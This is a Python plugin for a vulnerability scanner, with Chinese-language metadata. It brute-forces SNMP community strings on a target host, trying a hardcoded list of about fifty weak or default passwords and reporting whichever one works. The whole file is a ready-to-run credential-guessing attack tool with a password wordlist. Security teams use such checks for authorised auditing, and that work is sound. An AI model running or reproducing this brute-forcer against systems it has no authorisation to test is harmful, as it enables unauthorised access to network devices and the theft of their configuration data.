#!/usr/bin/env python3
# -*- coding:utf-8 -*-

import re
from pysnmp.entity.rfc3413.oneliner import cmdgen

def get_plugin_info():
    plugin_info = {
        "name": "SNMP 弱口令",
        "desc": "导致敏感信息泄露，严重情况可导致服务器被入侵控制。",
        "grade": "高",
        "type": "service",
        "keyword": "service:SNMP port:161",
    }
    return plugin_info

def snmp_connect(ip,port, key):
    try:
        errorIndication, errorStatus, errorIndex, varBinds = \
            cmdgen.CommandGenerator().getCmd(
                cmdgen.CommunityData('my-agent', key, 0),
                cmdgen.UdpTransportTarget((ip, port)),
                (1, 3, 6, 1, 2, 1, 1, 1, 0)
            )
        if varBinds:
            return True
    except:
        pass
    
def poc(arg):
    check_port = lambda x:x if re.match(r"(.*?):(\d+)$",x) else x+':161'
    host,port = check_port(arg).split(':')
    passwd_list = ["public","private","root","password","123123","123","1","{user}","{user}{user}","{user}1","{user}123","{user}2016","{user}2015","{user}!","","password01!","root@dba","P@ssw0rd!!","qwa123","root#123","12345678","test","123qwe!@#","123456789","123321","1314520","666666","woaini","fuckyou","000000","1234567890","8888888","qwerty","1qaz2wsx","abc123","abc123456","1q2w3e4r","123qwe","159357","p@ssw0rd","p@55w0rd","password!","p@ssw0rd!","password1","123qwe!@#","123QWE!@#","!@#qwe123","123qwe!@#$","1qaz@WSX","r00t","tomcat","apache","system"]
    error_i=0
    for passwd in passwd_list:
        try:
            if snmp_connect(host,int(port), passwd):
                return f'{arg}\t{passwd}'
        except Exception as e:
            if "Errno 10061" in str(e) or "WinError 10061" in str(e) or "timed out" in str(e): error_i+=1
        if error_i >= 3:return
    
if __name__ == '__main__':
    import sys
    if len(sys.argv) != 2:
        print("{} IP[:port]".format(sys.argv[0]))
    else:
        print("{} {}".format(sys.argv[1],poc(sys.argv[1])))  

    
